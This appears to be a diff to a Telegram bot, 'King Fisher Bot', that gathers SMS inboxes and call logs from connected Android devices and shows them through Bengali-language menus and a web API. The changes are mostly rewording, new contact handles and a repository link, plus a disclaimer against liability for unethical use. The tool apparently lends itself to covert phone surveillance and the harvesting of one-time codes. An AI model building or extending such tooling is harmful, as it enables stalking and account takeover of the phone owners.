@@ -1,6 +1,7 @@
 """
 King Fisher Bot - Real Device Data Integration
 Telegram bot that receives and displays real SMS/Call logs from Android devices
+Repository: https://github.com/King-Fisher-bot/King-Fisher
 """
 
 import os
@@ -146,11 +147,11 @@ def main_menu():
 def items_menu():
     return InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("📩 এসএমএস ইনবক্স", callback_data="sms"),
+            InlineKeyboardButton("📩 এস. এম. এস ইনবক্স", callback_data="sms"),
             InlineKeyboardButton("📞 কল লিস্ট", callback_data="call"),
         ],
         [InlineKeyboardButton("📊 সিস্টেম স্ট্যাটাস", callback_data="status")],
-        [InlineKeyboardButton("📱 ডিভাইসসমূহ", callback_data="devices")],
+        [InlineKeyboardButton("📱 বর্তমান যুক্ত ডিভাইসসমূহ", callback_data="devices")],
         [InlineKeyboardButton("🔙 পিছনে যান", callback_data="back_items")],
     ])
 
@@ -173,7 +174,7 @@ def get_offer_text():
         "🎉 <b>বিশেষ অফার!</b> প্রথম ১০ জন ব্যবহারকারী পাচ্ছেন <b>ফ্রি প্রিমিয়াম</b> অ্যাক্সেস!",
         "🔥 <b>সীমিত সময়ের অফার!</b> আজই যোগ দিন এবং পাবেন <b>৫০% ছাড়</b>!",
         "💎 <b>প্রিমিয়াম ফিচার</b> এখন <b>ফ্রি</b>! শুধু আজকের জন্য!",
-        "🚀 <b>নতুন আপডেট!</b> রিয়েল-টাইম SMS এবং কল লগ এখন <b>আরও দ্রুত</b>!",
+        "🚀 <b>নতুন আপডেট!</b> রিয়েল-টাইম SMS এবং কল-লগ এখন <b>আরও দ্রুত</b>!",
         "🎁 <b>গিফট!</b> আপনার প্রথম ডিভাইস সংযোগে পাবেন <b>বোনাস ক্রেডিট</b>!",
     ]
     return random.choice(offers)
@@ -193,7 +194,7 @@ def get_greeting():
 
 OPENING = """
 ╔════════════════════════════╗
-   👑 <b>কিং ফিশার সিস্টেম</b>
+   👑 <b>KING FISHER SYSTEM</b>
 ╚════════════════════════════╝
 
 ✨ <b>সিস্টেম সক্রিয় হয়েছে</b>
@@ -229,9 +230,9 @@ HELP = """
 
 ━━━━━━━━━━━━━━━━━━
 📦 <b>সিস্টেম আইটেম</b>
-রিয়েল এসএমএস/কল লগ দেখুন
+রিয়েল এস. এম. এস/কল-লগ দেখুন
 
-📱 <b>ডিভাইসসমূহ</b>
+📱 <b>বর্তমান যুক্ত ডিভাইসসমূহ</b>
 সংযুক্ত ডিভাইস দেখুন
 
 🔄 <b>রিস্টার্ট</b>
@@ -281,12 +282,15 @@ ABOUT = """
 ━━━━━━━━━━━━━━━━━━
 
 🔹 <b>বৈশিষ্ট্য:</b>
-• রিয়েল-টাইম এসএমএস মনিটরিং
-• রিয়েল-টাইম কল লগ মনিটরিং
+• রিয়েল-টাইম এস. এম. এস মনিটরিং
+• রিয়েল-টাইম কল-লগ মনিটরিং
 • মাল্টি-ডিভাইস সাপোর্ট
 • সুরক্ষিত ওয়েবহুক যোগাযোগ
 
-<i>রিয়েল-টাইম এসএমএস এবং কল লগ মনিটরিং।</i>
+📦 <b>রিপোজিটরি:</b>
+https://github.com/King-Fisher-bot/King-Fisher
+
+<i>রিয়েল-টাইম এস. এম. এস এবং কল-লগ মনিটরিং।</i>
 """
 
 TERMS = """
@@ -299,8 +303,8 @@ TERMS = """
 3. বট ব্যবহারে কোনো অবৈধ কাজ সমর্থিত নয়।
 4. সার্ভিস যেকোনো সময় পরিবর্তন হতে পারে।
 5. ব্যবহারকারী নিজের ডেটার জন্য দায়ী।
-
-📌 <b>যোগাযোগ:</b> @honeyy_bees
+** অনৈতিক কাজে এই বট ব্যবহারে আইনী জটিলতায় কর্তৃপক্ষ দায়ী নয়**
+📌 <b>যোগাযোগ:</b> @fisher_king
 """
 
 PRIVACY = """
@@ -308,7 +312,7 @@ PRIVACY = """
    🔐 <b>গোপনীয়তা নীতি</b>
 ╚════════════════════════════╝
 
-• আপনার SMS এবং কল লগ শুধুমাত্র আপনার কাছেই দেখা যায়।
+• আপনার SMS এবং কল-লগ শুধুমাত্র আপনার কাছেই দেখা যায়।
 • ডেটা তৃতীয় পক্ষের সাথে শেয়ার করা হয় না।
 • ডেটা এনক্রিপ্টেডভাবে সংরক্ষণ করা হয়।
 • যেকোনো সময় ডেটা মুছে ফেলতে পারেন।
@@ -323,8 +327,8 @@ SUPPORT = """
 
 আপনার কোনো প্রশ্ন বা সমস্যা থাকলে যোগাযোগ করুন:
 
-📩 <b>টেলিগ্রাম:</b> @honeyy_bees
-📧 <b>ইমেইল:</b> support@kingfisher.bot
+📩 <b>টেলিগ্রাম:</b> @fisher_king
+📧 <b>ইমেইল:</b> supportkingfisherbot@gmail.com
 
 ⏰ <b>সময়:</b> ২৪/৭ সাপোর্ট
 
@@ -352,7 +356,7 @@ OFFER = f"""
 def format_realtime_sms(sms_list: List[Dict]) -> str:
     if not sms_list:
         return "📭 <b>কোনো SMS বার্তা পাওয়া যায়নি</b>\n\n<i>নিশ্চিত করুন আপনার অ্যান্ড্রয়েড ডিভাইস সংযুক্ত আছে এবং সেন্ডার স্ক্রিপ্ট চলছে।</i>"
-    lines = ["📩 <b>রিয়েল এসএমএস ইনবক্স</b>", "━━━━━━━━━━━━━━━━━━"]
+    lines = ["📩 <b>রিয়েল এস. এম. এস ইনবক্স</b>", "━━━━━━━━━━━━━━━━━━"]
     for i, sms in enumerate(sms_list[:10], 1):
         sender = sms.get("sender", "অজানা")
         body = sms.get("body", "")[:100]
@@ -370,8 +374,8 @@ def format_realtime_sms(sms_list: List[Dict]) -> str:
 
 def format_realtime_calls(call_list: List[Dict]) -> str:
     if not call_list:
-        return "📭 <b>কোনো কল লগ পাওয়া যায়নি</b>\n\n<i>নিশ্চিত করুন আপনার অ্যান্ড্রয়েড ডিভাইস সংযুক্ত আছে এবং সেন্ডার স্ক্রিপ্ট চলছে।</i>"
-    lines = ["📞 <b>রিয়েল কল লগ</b>", "━━━━━━━━━━━━━━━━━━"]
+        return "📭 <b>কোনো কল-লগ পাওয়া যায়নি</b>\n\n<i>নিশ্চিত করুন আপনার অ্যান্ড্রয়েড ডিভাইস সংযুক্ত আছে এবং সেন্ডার স্ক্রিপ্ট চলছে।</i>"
+    lines = ["📞 <b>রিয়েল কল-লগ</b>", "━━━━━━━━━━━━━━━━━━"]
     icons = {"Incoming": "📞", "Outgoing": "📤", "Missed": "❌", "Rejected": "🚫", "Blocked": "⛔", "Voicemail": "🎙️"}
     for i, call in enumerate(call_list[:10], 1):
         number = call.get("number", "অজানা")
@@ -417,7 +421,7 @@ def format_status(stats: Dict, devices: List[Dict]) -> str:
 
 📱 <b>সংযুক্ত ডিভাইস:</b> {stats['devices']}
 📩 <b>SMS বার্তা:</b> {stats['sms']}
-📞 <b>কল লগ:</b> {stats['calls']}
+📞 <b>কল-লগ:</b> {stats['calls']}
 📊 <b>মোট রেকর্ড:</b> {stats['total']}
 
 🔗 <b>সক্রিয় ডিভাইস:</b>
@@ -428,7 +432,7 @@ def format_status(stats: Dict, devices: List[Dict]) -> str:
 def format_device_info(devices: List[Dict]) -> str:
     if not devices:
         return "📭 <b>কোনো ডিভাইস সংযুক্ত নেই</b>\n\n<i>প্রথমে আপনার অ্যান্ড্রয়েড ডিভাইস থেকে ডেটা পাঠান।</i>"
-    lines = ["📱 <b>সংযুক্ত ডিভাইসসমূহ</b>", "━━━━━━━━━━━━━━━━━━"]
+    lines = ["📱 <b>সংযুক্ত বর্তমান যুক্ত ডিভাইসসমূহ</b>", "━━━━━━━━━━━━━━━━━━"]
     for dev in devices:
         name = dev['name'][:25] + '...' if len(dev['name']) > 25 else dev['name']
         lines.append(f"🟢 <b>{name}</b>")
@@ -663,7 +667,7 @@ app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, 
 
 @app.get("/")
 async def home():
-    return {"status": "online", "service": "King Fisher Bot", "version": "3.0.0", "mode": "Real Data", "docs": "/docs"}
+    return {"status": "online", "service": "King Fisher Bot", "version": "3.0.0", "mode": "Real Data", "docs": "/docs", "repository": "https://github.com/King-Fisher-bot/King-Fisher"}
 
 @app.get("/health")
 async def health():
@@ -688,4 +692,4 @@ async def status():
     stats = DeviceDataManager.get_stats()
     devices = DeviceDataManager.get_devices_with_names()
     device_details = [{"id": dev["id"], "name": dev["name"], "sms_count": len(DEVICE_DATA["sms"].get(dev["id"], [])), "call_count": len(DEVICE_DATA["calls"].get(dev["id"], []))} for dev in devices]
-    return {"status": "online", "devices": stats["devices"], "sms": stats["sms"], "calls": stats["calls"], "total": stats["total"], "device_list": device_details}
+    return {"status": "online", "devices": stats["devices"], "sms": stats["sms"], "calls": stats["calls"], "total": stats["total"], "device_list": device_details, "repository": "https://github.com/King-Fisher-bot/King-Fisher"}
